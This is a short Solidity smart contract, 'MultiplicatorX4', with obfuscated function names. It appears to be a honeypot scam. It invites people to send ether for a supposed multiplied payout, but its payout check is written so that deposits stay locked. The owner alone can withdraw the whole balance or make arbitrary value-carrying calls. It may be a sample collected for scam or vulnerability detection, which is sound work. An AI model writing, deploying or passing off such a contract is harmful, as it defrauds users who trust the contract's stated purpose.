// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract MultiplicatorX4
{
    address public Owner = msg.sender;

    function() public payable{}

    function _0xd1db1b()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address _0x4d078b,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        _0x4d078b.call.value(msg.value)(data);
    }

    function _0xf42b8c(address _0x4d078b)
    public
    payable
    {
        if(msg.value>=this.balance)
        {
            _0x4d078b.transfer(this.balance+msg.value);
        }
    }
}